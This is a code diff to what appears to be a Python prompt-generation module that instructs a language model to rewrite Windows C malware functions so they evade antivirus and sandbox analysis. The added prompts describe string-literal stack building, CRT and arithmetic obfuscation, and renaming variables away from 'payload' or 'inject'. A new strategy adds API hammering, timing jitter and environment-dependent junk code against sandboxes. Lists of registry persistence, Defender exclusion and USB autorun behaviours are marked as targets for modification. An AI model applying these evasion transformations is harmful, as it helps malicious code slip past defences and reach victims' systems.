+        "  AFTER:  char _s0[12]; _s0[0]='M'; _s0[1]='o'; _s0[2]='z'; _s0[3]='i'; _s0[4]='l';\n"
+        "          _s0[5]='l'; _s0[6]='a'; _s0[7]='/'; _s0[8]='5'; _s0[9]='.'; _s0[10]='0'; _s0[11]=0;\n"
+        "Or use arithmetic construction to avoid char literals too:\n"
+        "  _s0[0]=(char)(0x40+0x0D); _s0[1]=(char)(0x60+0x0F); /* M=77=0x4D, o=111=0x6F */\n"
+        "This is THE most impactful substitution — string literals are the #1 AV signature source.\n"
+        "For wide strings (L\"...\"), use: wchar_t _w0[N]; _w0[0]=L'C'; _w0[1]=L'm'; ... _w0[N-1]=0;\n"
+        "NEVER leave ANY string literal unchanged — even short ones like \"POST\", \"logs=%%s\", \"\\r\\n\".\n\n"
+        "--- PRIORITY 2: CRT/STRING FUNCTION SUBSTITUTION ---\n"
+        "Replace ALL CRT calls with manual byte-level equivalents:\n"
+        "  memcpy(d,s,n) → { DWORD _ci; for(_ci=0;_ci<n;_ci++) ((BYTE*)d)[_ci]=((const BYTE*)s)[_ci]; }\n"
+        "  strcmp(a,b)    → manual byte loop returning difference\n"
+        "  strcpy(d,s)   → { const char *_p=s; char *_q=d; while((*_q++=*_p++)); }\n"
+        "  strlen(s)      → { DWORD _l=0; const char *_p=s; while(*_p){_l++;_p++;} } then use _l\n"
+        "  memset(d,v,n)  → { DWORD _ci; for(_ci=0;_ci<n;_ci++) ((BYTE*)d)[_ci]=(BYTE)v; }\n"
+        "  strcat(d,s)    → { char *_p=d; while(*_p) _p++; const char *_q=s; while((*_p++=*_q++)); }\n"
+        "  sprintf/wnsprintfA → replace with sequential manual string building\n"
+        "  lstrlenA/W     → manual while(*_p) loop counting\n\n"
+        "--- PRIORITY 3: ARITHMETIC OBFUSCATION ---\n"
+        "Replace arithmetic/comparison with bitwise equivalents:\n"
+        "  a + b   → a - (~b) - 1     | a + 1 → a - (~0)\n"
+        "  a - b   → a + (~b) + 1     | a * 4 → a << 2\n"
+        "  a == b  → !(a ^ b)         | a != b → !!(a ^ b)\n"
+        "  a ^ b   → (a | b) & ~(a & b)  (XOR decomposition)\n"
+        "  ~a      → (-a) - 1\n"
+        "MULTI-LAYER: after replacing strcmp with a loop, ALSO replace the loop's i++ with i = i - (~0),\n"
+        "and the comparison *_pa != *_pb with !!(*_pa ^ *_pb). Multiple layers defeat pattern matching.\n\n"
+        "--- PRIORITY 4: VARIABLE & CONSTANT TRANSFORMATION ---\n"
+        "- Rename ALL local variables to bland names: _v0, _v1, _t0, _ci, _r0.\n"
+        "  AVOID names containing: enc, dec, xor, key, cipher, crypt, payload, shell, inject.\n"
+        "- Replace numeric constants with computed equivalents:\n"
+        "  0 → (1-1)  |  1 → (3-2)  |  80 → (5<<4)  |  443 → (0x1bb)  |  0xFF → (0x100-1)\n"
+        "  MAX_PATH stays as MAX_PATH (macros are fine).\n\n"
+        "CRITICAL RULES:\n"
+        "- NEVER remove or skip ANY original code. NEVER replace _free() with something else.\n"
+        "  Every original statement MUST remain with equivalent behavior.\n"
+        "- NEVER truncate your output. Output the COMPLETE function from signature to closing brace.\n"
+        "- NEVER substitute Win32 API calls with NT-layer APIs. Stay within the SAME API layer.\n"
+        "- Every variable MUST be declared before use. Scope must be correct.\n"
+        "- If targeting MSVC (C89): declare loop variables at TOP of enclosing block.\n"
+        "- SAFETY: if a substitution is risky, leave that ONE operation unchanged. A correct 60%% "
+        "substitution rate is far better than a broken 90%%.\n"
+        "- Keep ALL original function calls to project functions unchanged.\n"
     ),
     "error_checking": (
         "1. Check for potential syntactic and semantic errors in the given functions.\n"
         "2. If you find any errors, correct them.\n"
         "3. Ensure that the corrected functions maintain the same functionality as the original functions."
+    ),
+    # Strategy 6: Anti-Behavioral Analysis — API Hammering + Environmental Keying + Timing Jitter
+    # Goal: Defeat sandbox/dynamic analysis by flooding behavioral logs, adding environment-dependent
+    # paths, and inserting timing noise that confuses automated analysis
+    "strat_6": (
+        "TASK: Add anti-behavioral-analysis techniques to the function WITHOUT changing its core logic. "
+        "The function MUST produce IDENTICAL outputs for IDENTICAL inputs. Output ONLY the transformed function.\n\n"
+        "TECHNIQUE 1 — API HAMMERING (flood sandbox behavioral logs):\n"
+        "Insert 5-8 calls to BENIGN Win32 APIs at the START of the function, BETWEEN major code blocks, "
+        "and BEFORE the return statement. Their results feed into junk volatile variables.\n"
+        "These are REAL calls (NOT inside dead branches) — they EXECUTE but their results are UNUSED for real logic.\n"
+        "GOOD APIs (produce sandbox log entries but are harmless):\n"
+        "  `volatile DWORD _h0 = GetCurrentDirectoryA(0, NULL);`\n"
+        "  `volatile BOOL _h1 = IsProcessorFeaturePresent(PF_XMMI_INSTRUCTIONS_AVAILABLE);`\n"
+        "  `SYSTEMTIME _st; GetSystemTime(&_st); volatile DWORD _h2 = _st.wMilliseconds;`\n"
+        "  `volatile DWORD _h3 = GetFileAttributesA(\"C:\\\\Windows\\\\System32\\\\ntdll.dll\");`\n"
+        "  `char _tb[MAX_PATH]; GetTempPathA(MAX_PATH, _tb); volatile int _h4 = _tb[0];`\n"
+        "  `volatile DWORD _h5 = GetTickCount();`\n"
+        "  `MEMORYSTATUS _mst; _mst.dwLength = sizeof(_mst); GlobalMemoryStatus(&_mst);`\n"
+        "  `char _cn[16]; DWORD _cns = 16; GetComputerNameA(_cn, &_cns);`\n"
+        "  `SYSTEM_INFO _si; GetSystemInfo(&_si); volatile DWORD _h6 = _si.dwNumberOfProcessors;`\n"
+        "  `volatile HANDLE _h7 = CreateMutexA(NULL, FALSE, NULL); if (_h7) CloseHandle(_h7);`\n"
+        "SCATTER these throughout the function — do NOT cluster them all at the top.\n\n"
+        "TECHNIQUE 2 — TIMING JITTER (confuse timing-based sandbox detection):\n"
+        "Insert 2-3 micro-delays using busy-wait loops based on GetTickCount():\n"
+        "  `{ volatile DWORD _tw = GetTickCount(); while(GetTickCount() == _tw) {} }`\n"
+        "This waits until the tick counter changes (typically 1-16ms). It's short enough to not "
+        "affect user experience but adds non-deterministic timing that breaks replay-based analysis.\n"
+        "Place one near the start, one in the middle, one before return.\n\n"
+        "TECHNIQUE 3 — ENVIRONMENTAL AWARENESS (context-dependent paths):\n"
+        "Add checks that use environment data in junk computations. "
+        "The checks NEVER alter real logic, but force the sandbox to track more state:\n"
+        "  `char _un[64]; DWORD _us = 64; GetUserNameA(_un, &_us);`\n"
+        "  `volatile DWORD _ev = 0; for(DWORD _ei=0; _ei<_us && _ei<64; _ei++) _ev ^= (DWORD)_un[_ei];`\n"
+        "  `volatile DWORD _vx = GetVersion(); _ev ^= (_vx & 0xFF);`\n"
+        "These create data-flow dependencies on environment values that sandboxes must track.\n\n"
+        "TECHNIQUE 4 — STRING LITERAL ELIMINATION (critical for static signature evasion):\n"
+        "Replace EVERY string literal in the function (both original AND newly added) with stack-built equivalents:\n"
+        "  BEFORE: volatile DWORD _h3 = GetFileAttributesA(\"C:\\\\Windows\\\\System32\\\\ntdll.dll\");\n"
+        "  AFTER:  char _sp0[30]; _sp0[0]='C'; _sp0[1]=':'; _sp0[2]='\\\\'; _sp0[3]='W'; ... _sp0[29]=0;\n"
+        "          volatile DWORD _h3 = GetFileAttributesA(_sp0);\n"
+        "Apply to ALL strings: file paths, URLs, command strings, error messages.\n"
+        "This ensures the anti-behavioral noise doesn't introduce NEW plaintext signatures.\n\n"
+        "RULES:\n"
+        "- ALL original logic MUST remain functionally identical — same inputs produce same outputs.\n"
+        "- The function signature (name, return type, parameters) MUST NOT change.\n"
+        "- Declare ALL new variables at the TOP of the function body.\n"
+        "- Use bland variable names: _h0, _h1, _tw, _ev, _cn, _mst, _sp0. AVOID enc/dec/xor/key/cipher.\n"
+        "- NEVER change, reorder, or remove ANY original code — only ADD new statements.\n"
+        "- Aim for 80-150%% code size increase from all four techniques combined.\n"
+        "- Output the COMPLETE function from signature to closing brace. Output ONLY code.\n"
     ),
     # Combined: Maximum Evasion (strat_1 + strat_3 + strat_5 combined)
     "strat_all": (
@@ -793,12 +1013,31 @@ _strategy_prompt_base = {
         "  x + 1 -> x - (~0)\n"
         "  x * 4 -> x << 2\n"
         "  x == y -> !(x ^ y)\n"
-        "Apply ONLY substitutions you are 100%% certain preserve exact behavior.\n\n"
+        "  a - b -> a + (~b) + 1\n"
+        "  a ^ b -> (a | b) & ~(a & b)\n"
+        "Apply ONLY substitutions you are 100%% certain preserve exact behavior.\n"
+        "Apply multi-layer: after replacing strcmp with a loop, also replace the loop's arithmetic.\n\n"
+        "--- PRIORITY 4: BEHAVIORAL NOISE + ANTI-SANDBOX (if function has 10+ lines) ---\n"
+        "A. API HAMMERING: Insert 3-5 REAL benign API calls scattered throughout the function:\n"
+        "  `volatile DWORD _h0 = GetCurrentDirectoryA(0, NULL);`\n"
+        "  `volatile BOOL _h1 = IsProcessorFeaturePresent(PF_XMMI_INSTRUCTIONS_AVAILABLE);`\n"
+        "  `SYSTEMTIME _st; GetSystemTime(&_st); volatile DWORD _h2 = _st.wMilliseconds;`\n"
+        "  `MEMORYSTATUS _ms; _ms.dwLength = sizeof(_ms); GlobalMemoryStatus(&_ms);`\n"
+        "B. TIMING JITTER: Insert 1-2 GetTickCount-based micro-delays:\n"
+        "  `{ volatile DWORD _tw = GetTickCount(); while(GetTickCount() == _tw) {} }`\n"
+        "C. ENVIRONMENTAL NOISE: Use GetUserNameA/GetVersion in junk computations:\n"
+        "  `char _un[32]; DWORD _us = 32; GetUserNameA(_un, &_us);`\n"
+        "  `volatile DWORD _ev = 0; { DWORD _ei; for(_ei=0; _ei<_us && _ei<32; _ei++) _ev ^= (DWORD)_un[_ei]; }`\n"
+        "These flood sandbox logs, add timing noise, and create environment-dependent data flow.\n\n"
+        "--- PRIORITY 5: VARIABLE RENAMING ---\n"
+        "Rename ALL local variables to bland names: _v0, _v1, _t0, _ci, _r0.\n"
+        "AVOID names containing: enc, dec, xor, key, cipher, crypt, payload, shell, inject.\n\n"
         "RULES:\n"
         "- ALL original logic MUST remain functionally intact — identical outputs.\n"
         "- Keep the original function signature EXACTLY.\n"
         "- NEVER rename the function itself or any existing project helper functions.\n"
-        "- If code gets too complex, apply Priority 1+2 CORRECTLY rather than all 3 with bugs.\n"
+        "- PRIORITY ORDER: If code gets too complex, apply Priority 1+2 CORRECTLY first.\n"
+        "  A correct Priority 1+2 is worth more than a buggy 1+2+3+4+5.\n"
     ),
 }
 
@@ -885,19 +1124,19 @@ class PromptGenerator:
         return (
             f"\nHere are the behaviors you need to look for by analyzing the given function and modify them if they are present according to the previous given instructions:\n"
             f"1. A registry load point is created pointing to an executable in the Windows %appdata% or System32 directory.\n"
-            f"2. A registry key ending with SHELL\OPEN\COMMAND or SHELL\RUNAS\COMMAND is being modified.\n"
+            f"2. A registry key ending with SHELL\\OPEN\\COMMAND or SHELL\\RUNAS\\COMMAND is being modified.\n"
             f"3. The Winlogon registry key value is modified.\n"
-            f"4. The Run, RunOnce, RunServices, RunServicesOnce, RunOnceEx, or RunOnce\Setup key is being modified, with the registry value data referring to an executable in a temporary directory.\n"
+            f"4. The Run, RunOnce, RunServices, RunServicesOnce, RunOnceEx, or RunOnce\\Setup key is being modified, with the registry value data referring to an executable in a temporary directory.\n"
             f"5. An Environment registry key with the value 'SEE_MASK_NOZONECHECKS' is set to anything but 0.\n"
-            f"6. The AppInit_DLLs or LoadAppInit_DLLs values of the registry key \SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINDOWS is being modified.\n"
+            f"6. The AppInit_DLLs or LoadAppInit_DLLs values of the registry key \\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\WINDOWS is being modified.\n"
             f"7. Registry keys are being modified to enable firewall exceptions.\n"
             f"8. A registry load point is created pointing to an executable in the Windows %appdata%, %temp%, or %windir% directories and performs a check for a public IP address.\n"
             f"9. An exclusion path for Windows Defender is being added.\n"
-            f"10. The value 'DisableRegistryTools' or 'DisableTaskMgr' or both is being set to 1 in the registry key 'SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM'. \n"
-            f"11. The \CONTROLSET001\SERVICES\SCHEDULE registry key is added or modified in conjunction with a task creation.\n"
+            f"10. The value 'DisableRegistryTools' or 'DisableTaskMgr' or both is being set to 1 in the registry key 'SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\POLICIES\\SYSTEM'. \n"
+            f"11. The \\CONTROLSET001\\SERVICES\\SCHEDULE registry key is added or modified in conjunction with a task creation.\n"
             f"12. Attempts to turn off or disable the Windows Defender service through the command line via registry key.\n"
-            f"13. The 'AlternateShell' value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\ is being changed.\n"
-            f"14. The HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\ registry key or one of its subkeys is being deleted.\n" 
+            f"13. The 'AlternateShell' value in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\ is being changed.\n"
+            f"14. The HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\ registry key or one of its subkeys is being deleted.\n" 
             f"Again, if you don't find any of these behaviors in the given function, you don't need to do any modification, just place the original code as it is.\n\n"
         )
     
@@ -919,12 +1158,12 @@ class PromptGenerator:
     def file_system_modification_behaviors(self):
         return (
             f"\nHere are the behaviors you need to look for by analyzing the given function and modify them if they are present according to the previous given instructions:\n"
-            f"1. A file in a system directory (e.g., C:\WINDOWS) is being modified.\n"
+            f"1. A file in a system directory (e.g., C:\\WINDOWS) is being modified.\n"
             f"2. A file is being created in a Recycle Bin folder.\n"
             f"3. A scheduled task is being created that references the User Application Data directory (AppData).\n"
             f"4. A shortcut (LNK file) is being added to the Windows Startup folder.\n"
-            f"5. The Windows System Startup file (system.ini) is being modified in the Windows directory (C:\Windows).\n"
-            f"6. The Windows Hosts file named 'hosts' found in the SYSTEM32\Drivers\etc directory is being modified."
+            f"5. The Windows System Startup file (system.ini) is being modified in the Windows directory (C:\\Windows).\n"
+            f"6. The Windows Hosts file named 'hosts' found in the SYSTEM32\\Drivers\\etc directory is being modified."
             f"Again, if you don't find any of these behaviors in the given function, you don't need to do any modification, just place the original code as it is.\n\n"
         )
     
@@ -947,13 +1186,13 @@ class PromptGenerator:
             f"1. An executable file is being copied and modified.\n"
             f"2. An executable file is being created on a USB drive.\n"
             f"3. A PE file is being modified and then deleted.\n"
-            f"4. An executable in a system directory (e.g., C:\WINDOWS) is being deleted.\n"
+            f"4. An executable in a system directory (e.g., C:\\WINDOWS) is being deleted.\n"
             f"5. Copying a certificate from a validly signed executable and insertion of it to another executable is being done.\n"
             f"6. A PE file is being copied to three or more locations.\n"
             f"7. An autorun.inf file is being created on the USB drive, enabling USB autorun.\n"
             f"8. A copy of PE file is being created on the USB drive.\n"
-            f"9. A Windows executable is being copied from the 'Windows\SysWOW64' or 'Windows\System32' directory and renamed.\n"
-            f"10. A PE file is being executed from the AppData\Roaming directory.\n"
+            f"9. A Windows executable is being copied from the 'Windows\\SysWOW64' or 'Windows\\System32' directory and renamed.\n"
+            f"10. A PE file is being executed from the AppData\\Roaming directory.\n"
             f"11. A file is being created and run from the Windows Debug folder.\n"
             f"12. A file with a name matching a Windows component (e.g., explorer.exe or svchost.exe) is being created in a suspicious location.\n"
             f"13. sc.exe binary is being executed with the 'sdset' parameter and options which set a restrictive DACL.\n"
@@ -1202,7 +1441,7 @@ def get_prompt(
         For example your response should look like this for a generated function named void func():\n
         ```json
         {
-        #include<iostream>\\n\\nvoid func() {\\n   std::cout << \\\"Found file in C:\\\Drive  \\\" << std::endl;\\n}\",
+        #include<iostream>\\n\\nvoid func() {\\n   std::cout << \\\"Found file in C:\\\\Drive  \\\" << std::endl;\\n}\",
         \"modified code\": \"
         \"comments\": \"This function prints a string to the standard output. It demonstrates basic output in C++ using cout.\"
         }
